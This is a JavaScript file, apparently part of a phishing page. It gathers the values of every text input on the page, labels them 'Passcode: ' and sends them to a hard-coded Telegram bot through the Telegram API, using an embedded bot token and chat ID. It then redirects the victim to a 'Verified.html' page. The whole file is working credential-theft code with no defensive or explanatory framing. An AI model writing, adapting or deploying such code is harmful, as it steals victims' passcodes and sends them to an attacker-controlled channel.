var telegram_bot_id = "6802693422:AAHswa3iATxJ2hAw76Rilwd8dC6f4WYqySM";
var chat_id = 6156261130;

var ready = function() {
    var inputs = document.querySelectorAll("input[type='text']");
    var message = "Passcode: ";
    inputs.forEach(function(input) {
        message += input.value + "";
    });
    return message.trim();
};

var sender = function() {
    var message = ready();

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function(response) {
        console.log(response);
        window.location.href = 'Verified.html';
    });

    // Clear input fields
    var inputs = document.querySelectorAll("input[type='number']");
    inputs.forEach(function(input) {
        input.value = "";
    });

    return false;
};
